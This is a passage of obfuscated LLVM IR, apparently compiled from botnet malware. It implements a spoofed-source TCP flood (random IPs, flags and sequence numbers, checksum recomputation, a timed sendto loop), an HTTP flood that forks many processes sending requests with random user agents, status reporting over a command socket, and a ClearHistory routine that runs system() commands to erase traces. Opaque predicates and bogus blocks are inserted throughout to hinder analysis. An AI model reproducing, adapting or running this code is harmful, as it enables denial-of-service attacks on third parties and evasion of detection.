  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i32 0, i32 0)) #10
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %309, label %301

; <label>:301:                                    ; preds = %297
  %302 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %306, -257
  %308 = or i16 %307, 256
  store i16 %308, i16* %305, align 4
  br label %355

; <label>:309:                                    ; preds = %297
  %310 = load i8*, i8** %31, align 8
  %311 = call i32 @strcmp(i8* %310, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.80, i32 0, i32 0)) #10
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %321, label %313

; <label>:313:                                    ; preds = %309
  %314 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = and i16 %318, -4097
  %320 = or i16 %319, 4096
  store i16 %320, i16* %317, align 4
  br label %354

; <label>:321:                                    ; preds = %309
  %322 = load i8*, i8** %31, align 8
  %323 = call i32 @strcmp(i8* %322, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0)) #10
  %324 = icmp ne i32 %323, 0
  br i1 %324, label %333, label %325

; <label>:325:                                    ; preds = %321
  %326 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %327 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %326, i32 0, i32 0
  %328 = bitcast %union.anon.0* %327 to %struct.anon.1*
  %329 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %328, i32 0, i32 4
  %330 = load i16, i16* %329, align 4
  %331 = and i16 %330, -2049
  %332 = or i16 %331, 2048
  store i16 %332, i16* %329, align 4
  br label %353

; <label>:333:                                    ; preds = %321
  %334 = load i32, i32* @x.61
  %335 = load i32, i32* @y.62
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %333
  %342 = load i32, i32* @mainCommSock, align 4
  %343 = load i8*, i8** %31, align 8
  %344 = call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.82, i32 0, i32 0), i8* %343)
  %345 = load i32, i32* @x.61
  %346 = load i32, i32* @y.62
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %353

; <label>:353:                                    ; preds = %originalBBpart228, %325
  br label %354

; <label>:354:                                    ; preds = %353, %313
  br label %355

; <label>:355:                                    ; preds = %354, %301
  %356 = load i32, i32* @x.61
  %357 = load i32, i32* @y.62
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %355
  %364 = load i32, i32* @x.61
  %365 = load i32, i32* @y.62
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %372

; <label>:372:                                    ; preds = %originalBBpart232, %289
  br label %373

; <label>:373:                                    ; preds = %372, %277
  %374 = load i32, i32* @x.61
  %375 = load i32, i32* @y.62
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %373
  %382 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %382, i8** %31, align 8
  %383 = load i32, i32* @x.61
  %384 = load i32, i32* @y.62
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %254

; <label>:391:                                    ; preds = %originalBBpart224
  br label %392

; <label>:392:                                    ; preds = %391, %215
  %393 = call i32 @rand_cmwc()
  %394 = trunc i32 %393 to i16
  %395 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 0
  %397 = bitcast %union.anon.0* %396 to %struct.anon.1*
  %398 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %397, i32 0, i32 5
  store i16 %394, i16* %398, align 2
  %399 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 0
  %401 = bitcast %union.anon.0* %400 to %struct.anon.1*
  %402 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %401, i32 0, i32 6
  store i16 0, i16* %402, align 4
  %403 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 0
  %405 = bitcast %union.anon.0* %404 to %struct.anon.1*
  %406 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %405, i32 0, i32 7
  store i16 0, i16* %406, align 2
  %407 = load i32, i32* %17, align 4
  %408 = icmp eq i32 %407, 0
  br i1 %408, label %409, label %411

; <label>:409:                                    ; preds = %392
  %410 = call i32 @rand_cmwc()
  br label %432

; <label>:411:                                    ; preds = %392
  %412 = load i32, i32* @x.61
  %413 = load i32, i32* @y.62
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %411
  %420 = load i32, i32* %17, align 4
  %421 = trunc i32 %420 to i16
  %422 = call zeroext i16 @htons(i16 zeroext %421) #13
  %423 = zext i16 %422 to i32
  %424 = load i32, i32* @x.61
  %425 = load i32, i32* @y.62
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %432

; <label>:432:                                    ; preds = %originalBBpart240, %409
  %433 = phi i32 [ %410, %409 ], [ %423, %originalBBpart240 ]
  %434 = trunc i32 %433 to i16
  %435 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon.0* %436 to %struct.anon.1*
  %438 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %437, i32 0, i32 1
  store i16 %434, i16* %438, align 2
  %439 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %440 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %441 = call zeroext i16 @tcpcsum(%struct.iphdr* %439, %struct.tcphdr* %440)
  %442 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon.0* %443 to %struct.anon.1*
  %445 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %444, i32 0, i32 6
  store i16 %441, i16* %445, align 4
  %446 = bitcast i8* %173 to i16*
  %447 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 2
  %449 = load i16, i16* %448, align 2
  %450 = zext i16 %449 to i32
  %451 = call zeroext i16 @csum(i16* %446, i32 %450)
  %452 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 7
  store i16 %451, i16* %453, align 2
  %454 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %455 = load i32, i32* %18, align 4
  %456 = add nsw i32 %454, %455
  store i32 %456, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %457

; <label>:457:                                    ; preds = %526, %525, %432
  br label %458

; <label>:458:                                    ; preds = %457
  %459 = load i32, i32* %25, align 4
  %460 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %461 = call i64 @sendto(i32 %459, i8* %173, i64 %171, i32 0, %struct.sockaddr* %460, i32 16)
  %462 = load i32, i32* %27, align 4
  %463 = call i32 @GetRandomIP(i32 %462)
  %464 = call i32 @htonl(i32 %463) #13
  %465 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 8
  store i32 %464, i32* %466, align 4
  %467 = call i32 @rand_cmwc()
  %468 = trunc i32 %467 to i16
  %469 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 3
  store i16 %468, i16* %470, align 4
  %471 = call i32 @rand_cmwc()
  %472 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 0
  %474 = bitcast %union.anon.0* %473 to %struct.anon.1*
  %475 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %474, i32 0, i32 2
  store i32 %471, i32* %475, align 4
  %476 = call i32 @rand_cmwc()
  %477 = trunc i32 %476 to i16
  %478 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 0
  %480 = bitcast %union.anon.0* %479 to %struct.anon.1*
  %481 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %480, i32 0, i32 0
  store i16 %477, i16* %481, align 4
  %482 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 0
  %484 = bitcast %union.anon.0* %483 to %struct.anon.1*
  %485 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %484, i32 0, i32 6
  store i16 0, i16* %485, align 4
  %486 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %487 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %488 = call zeroext i16 @tcpcsum(%struct.iphdr* %486, %struct.tcphdr* %487)
  %489 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 0
  %491 = bitcast %union.anon.0* %490 to %struct.anon.1*
  %492 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %491, i32 0, i32 6
  store i16 %488, i16* %492, align 4
  %493 = bitcast i8* %173 to i16*
  %494 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 2
  %496 = load i16, i16* %495, align 2
  %497 = zext i16 %496 to i32
  %498 = call zeroext i16 @csum(i16* %493, i32 %497)
  %499 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 7
  store i16 %498, i16* %500, align 2
  %501 = load i32, i32* %33, align 4
  %502 = load i32, i32* %23, align 4
  %503 = icmp eq i32 %501, %502
  br i1 %503, label %504, label %526

; <label>:504:                                    ; preds = %458
  %505 = load i32, i32* @x.61
  %506 = load i32, i32* @y.62
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %504
  %513 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %514 = load i32, i32* %32, align 4
  %515 = icmp sgt i32 %513, %514
  %516 = load i32, i32* @x.61
  %517 = load i32, i32* @y.62
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %515, label %524, label %525

; <label>:524:                                    ; preds = %originalBBpart244
  br label %529

; <label>:525:                                    ; preds = %originalBBpart244
  store i32 0, i32* %33, align 4
  br label %457

; <label>:526:                                    ; preds = %458
  %527 = load i32, i32* %33, align 4
  %528 = add i32 %527, 1
  store i32 %528, i32* %33, align 4
  br label %457

; <label>:529:                                    ; preds = %524
  %530 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %530)
  br label %531

; <label>:531:                                    ; preds = %529, %originalBBpart212, %83, %76
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %532 = alloca i8*, align 8
  %533 = alloca i32, align 4
  %534 = alloca i32, align 4
  %535 = alloca i32, align 4
  %536 = alloca i8*, align 8
  %537 = alloca i32, align 4
  %538 = alloca i32, align 4
  %539 = alloca i32, align 4
  %540 = alloca %struct.sockaddr_in, align 4
  %541 = alloca i32, align 4
  %542 = alloca i32, align 4
  %543 = alloca i32, align 4
  %544 = alloca i8*, align 8
  %545 = alloca %struct.iphdr*, align 8
  %546 = alloca %struct.tcphdr*, align 8
  %547 = alloca i8*, align 8
  %548 = alloca i32, align 4
  %549 = alloca i32, align 4
  store i8* %0, i8** %532, align 8
  store i32 %1, i32* %533, align 4
  store i32 %2, i32* %534, align 4
  store i32 %3, i32* %535, align 4
  store i8* %4, i8** %536, align 8
  store i32 %5, i32* %537, align 4
  store i32 %6, i32* %538, align 4
  %550 = load i32, i32* %538, align 4
  store i32 %550, i32* %539, align 4
  %551 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %540, i32 0, i32 0
  store i16 2, i16* %551, align 4
  %552 = load i32, i32* %533, align 4
  %553 = icmp eq i32 %552, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %554 = call i32 @rand_cmwc()
  %555 = trunc i32 %554 to i16
  %556 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %555, i16* %556, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  store i32 1, i32* %26, align 4
  %557 = load i32, i32* %25, align 4
  %558 = bitcast i32* %26 to i8*
  %559 = call i32 @setsockopt(i32 %557, i32 0, i32 3, i8* %558, i32 4) #2
  %560 = icmp slt i32 %559, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %561 = load i32, i32* @mainCommSock, align 4
  %562 = call i32 (i32, i8*, ...) @sockprintf(i32 %561, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %126
  %563 = load i32, i32* %19, align 4
  %564 = icmp eq i32 %563, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %145
  store i32 0, i32* %27, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %254
  %565 = load i8*, i8** %31, align 8
  %566 = icmp ne i8* %565, null
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %333
  %567 = load i32, i32* @mainCommSock, align 4
  %568 = load i8*, i8** %31, align 8
  %569 = call i32 (i32, i8*, ...) @sockprintf(i32 %567, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.82, i32 0, i32 0), i8* %568)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %355
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %373
  %570 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %570, i8** %31, align 8
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %411
  %571 = load i32, i32* %17, align 4
  %572 = trunc i32 %571 to i16
  %573 = call zeroext i16 @htons(i16 zeroext %572) #13
  %574 = zext i16 %573 to i32
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %504
  %575 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %576 = load i32, i32* %32, align 4
  %577 = icmp sgt i32 %575, %576
  br label %originalBB42
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = load i32, i32* @x.63
  %2 = load i32, i32* @y.64
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.83, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.84, i32 0, i32 0))
  %11 = load i32, i32* @x.63
  %12 = load i32, i32* @y.64
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %19 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.83, i32 0, i32 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.84, i32 0, i32 0))
  br label %originalBB
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.65
  %5 = load i32, i32* @y.66
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca [1 x i8], align 1
  %19 = alloca [512 x i8], align 16
  %20 = alloca [3 x i8*], align 16
  %21 = alloca [3 x i8*], align 16
  %22 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %23 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %24 = sext i32 %23 to i64
  store i64 %24, i64* %17, align 8
  %25 = bitcast [3 x i8*]* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %25, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %26 = bitcast [3 x i8*]* %21 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %26, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %27 = call i32 @getdtablesize() #2
  %28 = sdiv i32 %27, 2
  store i32 %28, i32* %22, align 4
  store i32 0, i32* %15, align 4
  %29 = load i32, i32* @x.65
  %30 = load i32, i32* @y.66
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %originalBBpart216, %originalBBpart2
  %38 = load i32, i32* %15, align 4
  %39 = load i32, i32* %22, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %151

; <label>:41:                                     ; preds = %37
  %42 = call i32 @fork() #2
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %131

; <label>:44:                                     ; preds = %41
  br label %45

; <label>:45:                                     ; preds = %130, %44
  %46 = load i8*, i8** %12, align 8
  %47 = load i32, i32* %13, align 4
  %48 = trunc i32 %47 to i16
  %49 = call i32 @socket_connect(i8* %46, i16 zeroext %48)
  store i32 %49, i32* %16, align 4
  %50 = load i32, i32* %16, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %121

; <label>:52:                                     ; preds = %45
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %54 = call i8* @strcpy(i8* %53, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0)) #2
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #10
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = call i32 @rand() #2
  %60 = sext i32 %59 to i64
  %61 = urem i64 %60, 3
  %62 = getelementptr inbounds [3 x i8*], [3 x i8*]* %20, i64 0, i64 %61
  %63 = load i8*, i8** %62, align 8
  %64 = call i8* @strcpy(i8* %58, i8* %63) #2
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i8* @strcpy(i8* %68, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.92, i32 0, i32 0)) #2
  %70 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %72 = call i64 @strlen(i8* %71) #10
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = load i8*, i8** %12, align 8
  %75 = call i8* @strcpy(i8* %73, i8* %74) #2
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %77 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %78 = call i64 @strlen(i8* %77) #10
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = call i8* @strcpy(i8* %79, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.93, i32 0, i32 0)) #2
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %82 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %83 = call i64 @strlen(i8* %82) #10
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = call i32 @rand() #2
  %86 = sext i32 %85 to i64
  %87 = urem i64 %86, 32
  %88 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %87
  %89 = load i8*, i8** %88, align 8
  %90 = call i8* @strcpy(i8* %84, i8* %89) #2
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %93 = call i64 @strlen(i8* %92) #10
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = call i8* @strcpy(i8* %94, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.94, i32 0, i32 0)) #2
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %98 = call i64 @strlen(i8* %97) #10
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = call i32 @rand() #2
  %101 = sext i32 %100 to i64
  %102 = urem i64 %101, 3
  %103 = getelementptr inbounds [3 x i8*], [3 x i8*]* %21, i64 0, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = call i8* @strcpy(i8* %99, i8* %104) #2
  %106 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %107 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %108 = call i64 @strlen(i8* %107) #10
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = call i8* @strcpy(i8* %109, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0)) #2
  %111 = load i32, i32* %16, align 4
  %112 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %113 = getelementptr inbounds [512 x i8], [512 x i8]* %19, i32 0, i32 0
  %114 = call i64 @strlen(i8* %113) #10
  %115 = call i64 @write(i32 %111, i8* %112, i64 %114)
  %116 = load i32, i32* %16, align 4
  %117 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %118 = call i64 @read(i32 %116, i8* %117, i64 1)
  %119 = load i32, i32* %16, align 4
  %120 = call i32 @close(i32 %119)
  br label %121

; <label>:121:                                    ; preds = %52, %45
  %122 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %123 = sext i32 %122 to i64
  %124 = load i64, i64* %17, align 8
  %125 = load i32, i32* %14, align 4
  %126 = sext i32 %125 to i64
  %127 = add nsw i64 %124, %126
  %128 = icmp sge i64 %123, %127
  br i1 %128, label %129, label %130

; <label>:129:                                    ; preds = %121
  call void @_exit(i32 0) #12
  unreachable

; <label>:130:                                    ; preds = %121
  br label %45

; <label>:131:                                    ; preds = %41
  br label %132

; <label>:132:                                    ; preds = %131
  %133 = load i32, i32* @x.65
  %134 = load i32, i32* @y.66
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %132
  %141 = load i32, i32* %15, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %15, align 4
  %143 = load i32, i32* @x.65
  %144 = load i32, i32* @y.66
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart216, label %originalBB8alteredBB

originalBBpart216:                                ; preds = %originalBB8
  br label %37

; <label>:151:                                    ; preds = %37
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %152 = alloca i8*, align 8
  %153 = alloca i32, align 4
  %154 = alloca i32, align 4
  %155 = alloca i32, align 4
  %156 = alloca i32, align 4
  %157 = alloca i64, align 8
  %158 = alloca [1 x i8], align 1
  %159 = alloca [512 x i8], align 16
  %160 = alloca [3 x i8*], align 16
  %161 = alloca [3 x i8*], align 16
  %162 = alloca i32, align 4
  store i8* %0, i8** %152, align 8
  store i32 %1, i32* %153, align 4
  store i32 %2, i32* %154, align 4
  %163 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %164 = sext i32 %163 to i64
  store i64 %164, i64* %157, align 8
  %165 = bitcast [3 x i8*]* %160 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %165, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %166 = bitcast [3 x i8*]* %161 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %166, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %167 = call i32 @getdtablesize() #2
  %_ = sub i32 0, %167
  %gen = add i32 %_, 2
  %_1 = shl i32 %167, 2
  %_2 = sub i32 %167, 2
  %gen3 = mul i32 %_2, 2
  %_4 = sub i32 0, %167
  %gen5 = add i32 %_4, 2
  %_6 = shl i32 %167, 2
  %_7 = shl i32 %167, 2
